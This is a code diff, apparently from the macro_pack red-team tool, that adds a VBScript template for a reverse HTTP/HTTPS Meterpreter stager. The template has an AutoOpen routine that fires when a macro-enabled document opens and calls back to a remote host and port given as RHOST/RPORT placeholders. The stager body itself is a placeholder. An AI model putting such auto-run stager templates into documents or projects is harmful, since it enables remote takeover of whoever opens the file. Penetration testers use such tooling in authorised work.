@@ -228,7 +228,6 @@ r"""
 'CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
 'https://github.com/tyranid/DotNetToJScript
 
-' Adapted for macro_pack to also work in MS word
 
 Public RHOST As String 
 Public RPORT As String
@@ -241,6 +240,39 @@ Sub AutoOpen()
 End Sub
 
 'Insert Meterpreter from vbLib here
+
+"""
+
+
+
+WEBMETER =  \
+r"""
+'____   ______________  ___________      __      ___.       _____          __                
+'\   \ /   /\______   \/   _____/  \    /  \ ____\_ |__    /     \   _____/  |_  ___________ 
+' \   Y   /  |    |  _/\_____  \\   \/\/   // __ \| __ \  /  \ /  \_/ __ \   __\/ __ \_  __ \
+'  \     /   |    |   \/        \\        /\  ___/| \_\ \/    Y    \  ___/|  | \  ___/|  | \/
+'   \___/    |______  /_______  / \__/\  /  \___  >___  /\____|__  /\___  >__|  \___  >__|   
+'                   \/        \/       \/       \/    \/         \/     \/          \/       
+
+'VBScript Reversed HTTP/HTTPS Meterpreter Stager - by Cn33liz 2017
+'CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
+'https://github.com/tyranid/DotNetToJScript
+
+'This Stager is Proxy aware and should run on x86 as well as x64
+
+Public RHOST As String 
+Public RPORT As String
+Public UseHTTPS As String
+
+' Auto launch when VBA enabled
+Sub AutoOpen()
+    RHOST = "<<<RHOST>>>"
+    RPORT = "<<<RPORT>>>"
+    UseHTTPS = "yes"
+    WebMeter
+End Sub
+
+'Insert WebMeter from vbLib here
 
 """
 
